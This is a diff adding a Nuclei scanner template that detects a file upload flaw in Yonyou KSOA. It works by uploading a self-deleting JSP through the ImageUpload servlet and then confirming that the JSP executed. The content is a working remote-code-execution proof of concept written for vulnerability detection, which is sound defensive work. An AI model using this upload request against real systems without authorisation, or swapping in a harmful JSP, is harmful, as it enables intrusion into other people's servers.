@@ -1,0 +1,52 @@
+id: yaml-poc-yonyou-yonyou_ksoa-file_upload-CT-463219
+
+info:
+  name: Yonyou KSOA File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects a file upload vulnerability in Yonyou KSOA allowing remote code execution via JSP file upload.
+  reference:
+    - https://cn-sec.com/archives/1329088.html
+
+variables:
+  rfilename: "{{rand_text_alpha(4)}}"
+  s1: "{{rand_int(40000, 44800)}}"
+  s2: "{{rand_int(40000, 44800)}}"
+  rboundary: "{{rand_text_alpha(8)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/servlet/com.sksoft.bill.ImageUpload?filepath=/&filename={{rfilename}}.jsp&_ZQA_ID="
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}"
+    body: |
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="file"; filename="{{rfilename}}.jsp"
+      Content-Type: text/plain
+
+      <%out.print({{s1}} * {{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundary{{rboundary}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<root>"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/pictures/{{rfilename}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{to_number(s1)*to_number(s2)}}"
